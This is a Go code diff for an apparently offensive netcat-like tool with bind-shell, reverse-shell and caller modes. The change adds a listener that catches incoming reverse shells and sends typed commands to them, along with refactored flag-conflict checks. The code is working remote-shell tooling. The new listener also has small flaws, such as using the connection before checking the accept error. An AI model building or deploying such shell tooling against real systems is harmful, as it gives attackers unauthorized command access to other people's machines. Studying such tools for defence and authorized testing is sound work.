@@ -21,6 +21,7 @@ type NetcatInput struct {
 	Bind        bool
 	Reverse     bool
 	Caller      bool
+	Listener    bool
 }
 
 func (nni *NetcatInput) SetNetcatInput(fs *flag.FlagSet) {
@@ -29,18 +30,44 @@ func (nni *NetcatInput) SetNetcatInput(fs *flag.FlagSet) {
 	fs.BoolVar(&nni.Bind, "bind", false, "Set Flag for Bind shell. Note: do not use with --reverse")
 	fs.BoolVar(&nni.Reverse, "reverse", false, "Set Flag for a Reverse Shell. Note: do not use with --bind")
 	fs.BoolVar(&nni.Caller, "caller", false, "Call to a bind shell.")
+	fs.BoolVar(&nni.Listener, "listen", false, "Create a Listener for rev shells.")
 }
 
-func NetcatBind(nni *NetcatInput) {
+func NetcatArgLogic(nni *NetcatInput) {
 	var (
 		bindAddress = fmt.Sprintf(":%d", nni.Port)
 		osRuntime   = *environment.OperatingSystemDetect()
 		callAddress = fmt.Sprintf("%s:%d", nni.HostAddress, nni.Port)
 	)
-
-	if nni.Bind && nni.Reverse && nni.Caller {
-		log.Fatalln("Cannot bind, reverse, and call at the same time.")
+	NetcatArgumentExceptions(nni)
+	if nni.Bind {
+		BindLogic(bindAddress, osRuntime)
 	}
+	if nni.Reverse {
+		ReverseLogic(callAddress, osRuntime)
+	}
+	if nni.Caller {
+		CallBindLogic(callAddress)
+	}
+	if nni.Listener {
+		OpenListener(bindAddress, osRuntime)
+	}
+}
+
+func NetcatArgumentExceptions(nni *NetcatInput) {
+	if nni.Bind && nni.Reverse && nni.Caller && nni.Listener {
+		log.Fatalln("Cannot bind, reverse, call, and listen at the same time.")
+	}
+	if nni.Bind && nni.Reverse && nni.Listener {
+		log.Fatalln("Cannot bind, reverse, and listen at the same time.")
+	}
+	if nni.Bind && nni.Caller && nni.Listener {
+		log.Fatalln("Cannot bind, call, and listen at the same time.")
+	}
+	if nni.Caller && nni.Reverse && nni.Listener {
+		log.Fatalln("Cannot call, reverse, and listen at the same time.")
+	}
+
 	if nni.Bind && nni.Reverse {
 		log.Fatalln("Cannot bind and reverse at the same time.")
 	}
@@ -51,14 +78,14 @@ func NetcatBind(nni *NetcatInput) {
 		log.Fatalln("Cannot reverse and call at the same time.")
 	}
 
-	if nni.Bind {
-		BindLogic(bindAddress, osRuntime)
+	if nni.Bind && nni.Listener {
+		log.Fatalln("Cannot bind and listen at the same time.")
 	}
-	if nni.Reverse {
-		ReverseLogic(callAddress, osRuntime)
+	if nni.Caller && nni.Listener {
+		log.Fatalln("Cannot call and listen at the same time.")
 	}
-	if nni.Caller {
-		CallBindLogic(callAddress, osRuntime)
+	if nni.Reverse && nni.Listener {
+		log.Fatalln("Cannot reverse and listen at the same time.")
 	}
 }
 
@@ -176,7 +203,7 @@ func RevHandleDarwin(caller net.Conn) {
 	cmd.Run()
 }
 
-func CallBindLogic(callAddress string, osRuntime string) {
+func CallBindLogic(callAddress string) {
 	caller, err := net.Dial("tcp", callAddress)
 	if err != nil {
 		log.Fatalln(err)
@@ -201,5 +228,34 @@ func BindShellCall(caller net.Conn) {
 			log.Fatalln(err)
 		}
 		go io.Copy(os.Stdout, caller)
+	}
+}
+
+func OpenListener(bindAddress string, osRuntime string) {
+	listener, err := net.Listen("tcp", bindAddress)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	defer listener.Close()
+
+	log.Printf("Listener opened on %s\n", bindAddress)
+	// for {
+	conn, err := listener.Accept()
+	log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+	if err != nil {
+		log.Fatalln("Unable to accept connection.")
+	}
+	for {
+		reader := bufio.NewReader(os.Stdin)
+		text, err := reader.ReadString('\n')
+		if err != nil {
+			log.Fatalln(err)
+		}
+		text = strings.TrimSpace(text)
+		_, err = io.WriteString(conn, text+"\n")
+		if err != nil {
+			log.Fatalln(err)
+		}
+		go io.Copy(os.Stdout, conn)
 	}
 }
